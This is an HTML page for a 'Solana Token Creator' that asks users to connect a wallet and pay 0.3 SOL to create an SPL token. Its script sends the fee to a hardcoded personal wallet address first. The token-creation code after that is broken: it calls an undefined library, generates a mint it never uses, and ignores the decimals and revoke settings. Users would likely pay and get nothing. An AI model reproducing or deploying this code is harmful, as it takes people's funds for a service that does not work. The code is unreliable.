<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Create your own Solana SPL tokens easily with our simple and secure Solana Token Creator. Connect your wallet and manage tokens effortlessly.">
    <meta name="keywords" content="Solana, SPL Token, Solana Token Creator, Crypto, Blockchain, Token Generator">
    <meta name="author" content="Your Project Name">
    <title>Solana Token Creator - Generate Your SPL Tokens</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.33.0/solana-web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets@0.7.10/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@0.7.10/dist/umd/index.min.js"></script>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            text-align: center;
            background-color: #121826;
            color: white;
            padding: 20px;
        }

        .container {
            max-width: 400px;
            margin: auto;
            background: linear-gradient(135deg, #1c2333, #293448);
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0px 4px 20px rgba(80, 122, 255, 0.3);
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #ffffff;
            margin-bottom: 15px;
        }

        input, button, textarea {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            border: none;
            font-size: 16px;
            outline: none;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            transition: 0.2s;
        }

        .wallet-btn, .action-btn {
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            padding: 12px;
            border-radius: 8px;
            font-size: 16px;
            width: 100%;
            border: none;
        }

        .wallet-btn {
            background-color: #3498db;
            box-shadow: 0px 4px 10px rgba(52, 152, 219, 0.4);
        }

        .wallet-btn:hover {
            background-color: #1d6fa5;
        }

        .action-btn {
            background-color: #e74c3c;
            box-shadow: 0px 4px 10px rgba(231, 76, 60, 0.4);
        }

        .action-btn:hover {
            background-color: #c0392b;
        }

        /* Image preview styles */
        #preview {
            max-width: 100%;
            max-height: 200px;  /* Set the max height */
            margin-top: 15px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        /* Flexbox container for wallet buttons */
        .wallet-selection-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-evenly;
            gap: 10px;  /* Adds space between buttons */
            margin-top: 15px;
        }

        .wallet-btn {
            width: 45%;  /* Set each button width to 45% */
        }

        textarea {
            resize: vertical; /* Allows the textarea to be resized vertically */
            overflow: hidden;
            height: 50px; /* Initial height */
            transition: height 0.2s ease;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>üîó Solana Token Creator</h1>
        <p>Create your Solana SPL tokens easily and securely.</p>

        <p id="walletStatus">Wallet not connected</p>

        <!-- Wallet buttons -->
        <div class="wallet-selection-container">
            <button class="wallet-btn" onclick="connectWallet('phantom')">üü£ Phantom</button>
            <button class="wallet-btn" onclick="connectWallet('solflare')">üî• Solflare</button>
        </div>

        <div class="wallet-selection-container">
            <button class="wallet-btn" onclick="connectWallet('slope')">üîë Slope Wallet</button>
            <button class="wallet-btn" onclick="connectWallet('torus')">üåê Torus Wallet</button>
        </div>

        <!-- Token Name -->
        <label for="tokenName">Token Name</label>
        <input type="text" id="tokenName" placeholder="Enter token name">

        <!-- Token Symbol -->
        <label for="tokenSymbol">Token Symbol</label>
        <input type="text" id="tokenSymbol" placeholder="Enter token symbol">

        <!-- Decimals -->
        <label for="decimals">Decimals</label>
        <input type="number" id="decimals" value="6">

        <!-- Total Supply -->
        <label for="supply">Total Supply</label>
        <input type="number" id="supply" placeholder="Enter total supply">

        <!-- Description (Resizable) -->
        <label for="description">Description</label>
        <textarea id="description" placeholder="Enter token description" required></textarea>

        <!-- Token Image Upload -->
        <label for="tokenImage">Upload Token Image</label>
        <input type="file" id="tokenImage" accept="image/*">
        
        <!-- Image Preview -->
        <img id="preview" src="" alt="Image preview">

        <!-- Fees Section -->
        <div class="toggle-switch">
            <span>Revoke Freeze Authority</span>
            <label class="switch">
                <input type="checkbox" id="revokeFreeze" checked>
                <span class="slider"></span>
            </label>
            <span>(0.1 SOL)</span>
        </div>

        <div class="toggle-switch">
            <span>Revoke Mint Authority</span>
            <label class="switch">
                <input type="checkbox" id="revokeMint" checked>
                <span class="slider"></span>
            </label>
            <span>(0.1 SOL)</span>
        </div>

        <!-- Create Token Button -->
        <button class="action-btn" onclick="createToken()">Create Token (0.3 SOL)</button>
        <p class="status-message" id="status"></p>
    </div>

    <script>
        // Initialize wallet adapters
        const phantomWallet = new window.solanaWeb3.PhantomWalletAdapter();
        const solflareWallet = new window.solanaWeb3.SolflareWalletAdapter();

        async function connectWallet(walletType) {
            let walletProvider;
            if (walletType === "phantom") {
                walletProvider = phantomWallet;
            } else if (walletType === "solflare") {
                walletProvider = solflareWallet;
            } else {
                alert(`Please install ${walletType} Wallet!`);
                return;
            }

            try {
                const response = await walletProvider.connect();
                document.getElementById("walletStatus").innerText = `‚úÖ Connected: ${response.publicKey.toString()}`;
            } catch (err) {
                document.getElementById("walletStatus").innerText = "‚ùå Failed to connect wallet";
            }
        }

        // Image preview functionality
        document.getElementById("tokenImage").addEventListener("change", function (event) {
            const file = event.target.files[0];
            const reader = new FileReader();

            reader.onload = function () {
                const preview = document.getElementById("preview");
                preview.src = reader.result;
                preview.style.display = "block";
            }

            if (file) {
                reader.readAsDataURL(file);
            }
        });

        // Create token function
        async function createToken() {
            const tokenName = document.getElementById("tokenName").value;
            const tokenSymbol = document.getElementById("tokenSymbol").value;
            const totalSupply = document.getElementById("supply").value;
            const description = document.getElementById("description").value;

            if (!tokenName || !tokenSymbol || !totalSupply || !description) {
                alert("Please fill in all fields.");
                return;
            }

            if (isNaN(totalSupply) || totalSupply <= 0) {
                alert("Total Supply should be a valid positive number.");
                return;
            }

            if (!document.getElementById("tokenImage").files[0]) {
                alert("Please upload an image.");
                return;
            }

            document.getElementById("status").innerText = "Creating token... Please wait.";

            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
            const publicKey = window.solana.publicKey;
            const balance = await connection.getBalance(publicKey);

            const fee = 0.3 * 1e9; // 0.3 SOL in lamports (1 SOL = 1e9 lamports)

            if (balance < fee) {
                document.getElementById("status").innerText = "‚ùå Insufficient funds! Please ensure you have at least 0.3 SOL to create the token.";
                return;
            }

            const personalWalletAddress = 'HGF6MqYTrAViZTeRKStyLG81apiGaGz2GXg7Cw1n6n3V';

            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: personalWalletAddress,
                    lamports: fee,
                })
            );

            try {
                const signature = await window.solana.signAndSendTransaction(transaction);
                await connection.confirmTransaction(signature);

                const mint = await solanaWeb3.Keypair.generate();
                const token = await splToken.createMint(
                    connection, window.solana, publicKey, null, 6 // decimals
                );

                document.getElementById("status").innerText = `‚úÖ Token ${tokenName} created successfully!`;
            } catch (error) {
                document.getElementById("status").innerText = "‚ùå Transaction failed or was cancelled.";
            }
        }
    </script>

</body>
</html>
